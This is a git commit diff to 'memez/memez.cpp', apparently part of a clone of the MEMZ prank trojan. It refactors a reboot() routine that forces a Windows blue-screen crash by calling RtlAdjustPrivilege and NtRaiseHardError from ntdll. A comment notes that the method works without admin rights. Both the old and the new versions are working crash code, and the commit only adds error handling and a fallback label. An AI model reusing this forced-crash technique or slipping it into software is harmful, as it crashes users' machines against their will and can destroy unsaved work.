c79f64662c9c883c73c55db460c4825b064b17eb
acarlson99 <acarlson99@gmail.com>
2019-05-22 15:28:53 -0700

    🅱️

--- memez/memez.cpp
+++ memez/memez.cpp
@@ -31,16 +31,25 @@ void reboot(void)
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
-	HMODULE ntdll = LoadLibraryA("ntdll");
-	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
-	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+	HMODULE ntdll;
+	FARPROC RtlAdjustPrivilege;
+	FARPROC NtRaiseHardError;
 
-	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
-		BOOLEAN tmp1; DWORD tmp2;
-		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+	{
+		if (!(ntdll = LoadLibraryA("ntdll"))) {
+			goto failcase;
+		}
+		RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+		NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+
+		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+			BOOLEAN tmp1; DWORD tmp2;
+			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+		}
 	}
 
+failcase:
 	// If the computer is still running, do it the normal way
 	HANDLE token;
 	TOKEN_PRIVILEGES privileges;
